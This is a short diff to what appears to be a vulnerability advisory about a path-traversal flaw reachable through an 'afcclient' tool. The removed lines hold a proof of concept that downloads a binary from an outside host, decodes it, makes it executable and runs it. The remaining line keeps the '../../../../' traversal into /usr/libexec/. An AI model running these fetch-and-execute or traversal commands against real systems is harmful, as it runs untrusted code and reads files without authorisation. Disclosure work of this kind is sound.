@@ -84,7 +84,6 @@ This issue can be resolved by improved path handling.
 
 _Quick Poc:_
 ```sh
-curl http://exploitation.cool/exploits/afcclient.bin | base 64 -D > afcclient && \
-chmod +x afcclient && \
-afcclient ls ../../../../../../usr/libexec/ \
+//afcclient can be found base64 encodedin data directory
+afcclient ls ../../../../../../usr/libexec/ 
 ```
